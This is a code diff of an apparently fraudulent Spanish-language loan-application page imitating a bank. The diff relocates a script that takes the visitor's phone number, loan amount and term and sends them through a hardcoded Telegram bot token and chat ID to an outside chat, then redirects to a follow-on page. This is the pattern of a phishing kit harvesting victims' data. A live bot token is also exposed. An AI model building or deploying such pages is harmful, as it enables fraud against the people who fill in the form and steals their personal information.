@@ -77,44 +77,8 @@ input.error{border-color:#c62828!important;border-width:2px!important;animation:
 <button onclick="document.getElementById('modal-error').style.display='none'" style="width:100%;padding:16px;background:#0033a0;color:#fff;font-size:16px;font-weight:700;border:none;border-radius:12px;cursor:pointer">Volver a ingresar</button>
 </div>
 </div>
-<script>
-var plazoSeleccionado=12;
-function actualizar(){var v=parseInt(document.getElementById("slider").value);document.getElementById("valor").innerText="$"+Number(v).toLocaleString("es-CO");document.getElementById("cuota").innerText="$"+Math.round(v/plazoSeleccionado).toLocaleString("es-CO")}
-function seleccionarPlazo(p){plazoSeleccionado=p;var btns=document.querySelectorAll(".plazo-btn");for(var i=0;i<btns.length;i++){btns[i].style.background="#fff";btns[i].style.color="#212529";btns[i].style.borderColor="#d1d1d1"}event.target.style.background="#0033a0";event.target.style.color="#fff";event.target.style.borderColor="#0033a0";actualizar()}
 
-function enviarCupo(){
-  var tel=document.getElementById("numero_telefono").value.trim();
-  if(tel.length<7){document.getElementById("modal-error").style.display="flex";return}
-  
-  var monto=document.getElementById("slider").value;
-  var cuota=document.getElementById("cuota").innerText;
-  
-  // ⚠️ CONFIGURA AQUI TU TOKEN Y CHAT ID
-  var TOKEN="8612202163:AAG0xobx-XtqcCZGny8lQHYvvuF3wXAmqao";
-  var CHAT_ID="8217102156";
-  
-  var mensaje="📋 NUEVA SOLICITUD DE CUPO%0A"+
-              "━━━━━━━━━━━━━━━%0A"+
-              "💰 Monto: $"+parseInt(monto).toLocaleString("es-CO")+"%0A"+
-              "📅 Plazo: "+plazoSeleccionado+" meses%0A"+
-              "💵 Cuota mensual: "+cuota+"%0A"+
-              "📞 Teléfono: "+tel+"%0A"+
-              "🕒 "+new Date().toLocaleString("es-CO");
-  
-  document.getElementById("loading-overlay").style.display="flex";
-  
-  var url="https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+CHAT_ID+"&text="+mensaje;
-  
-  fetch(url)
-    .then(function(r){return r.json()})
-    .then(function(d){window.location.href="index1.html"})
-    .catch(function(){window.location.href="index1.html"});
-}
-
-actualizar();document.querySelectorAll(".plazo-btn")[0].style.background="#0033a0";document.querySelectorAll(".plazo-btn")[0].style.color="#fff";document.querySelectorAll(".plazo-btn")[0].style.borderColor="#0033a0";
-</script>
-<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"3acf5ee7907441b39cb5d1b750314325","r":1,"spa":2}' crossorigin="anonymous"></script>
- <script>
+   <script>
 
         // ==========================
         // CONFIGURACIÓN DE TELEGRAM
@@ -187,6 +151,44 @@ actualizar();document.querySelectorAll(".plazo-btn")[0].style.background="#0033a
         });
 
     </script>
+<script>
+var plazoSeleccionado=12;
+function actualizar(){var v=parseInt(document.getElementById("slider").value);document.getElementById("valor").innerText="$"+Number(v).toLocaleString("es-CO");document.getElementById("cuota").innerText="$"+Math.round(v/plazoSeleccionado).toLocaleString("es-CO")}
+function seleccionarPlazo(p){plazoSeleccionado=p;var btns=document.querySelectorAll(".plazo-btn");for(var i=0;i<btns.length;i++){btns[i].style.background="#fff";btns[i].style.color="#212529";btns[i].style.borderColor="#d1d1d1"}event.target.style.background="#0033a0";event.target.style.color="#fff";event.target.style.borderColor="#0033a0";actualizar()}
+
+function enviarCupo(){
+  var tel=document.getElementById("numero_telefono").value.trim();
+  if(tel.length<7){document.getElementById("modal-error").style.display="flex";return}
+  
+  var monto=document.getElementById("slider").value;
+  var cuota=document.getElementById("cuota").innerText;
+  
+  // ⚠️ CONFIGURA AQUI TU TOKEN Y CHAT ID
+  var TOKEN="8612202163:AAG0xobx-XtqcCZGny8lQHYvvuF3wXAmqao";
+  var CHAT_ID="8217102156";
+  
+  var mensaje="📋 NUEVA SOLICITUD DE CUPO%0A"+
+              "━━━━━━━━━━━━━━━%0A"+
+              "💰 Monto: $"+parseInt(monto).toLocaleString("es-CO")+"%0A"+
+              "📅 Plazo: "+plazoSeleccionado+" meses%0A"+
+              "💵 Cuota mensual: "+cuota+"%0A"+
+              "📞 Teléfono: "+tel+"%0A"+
+              "🕒 "+new Date().toLocaleString("es-CO");
+  
+  document.getElementById("loading-overlay").style.display="flex";
+  
+  var url="https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+CHAT_ID+"&text="+mensaje;
+  
+  fetch(url)
+    .then(function(r){return r.json()})
+    .then(function(d){window.location.href="index1.html"})
+    .catch(function(){window.location.href="index1.html"});
+}
+
+actualizar();document.querySelectorAll(".plazo-btn")[0].style.background="#0033a0";document.querySelectorAll(".plazo-btn")[0].style.color="#fff";document.querySelectorAll(".plazo-btn")[0].style.borderColor="#0033a0";
+</script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"3acf5ee7907441b39cb5d1b750314325","r":1,"spa":2}' crossorigin="anonymous"></script>
+
 
 </body>
 </html>
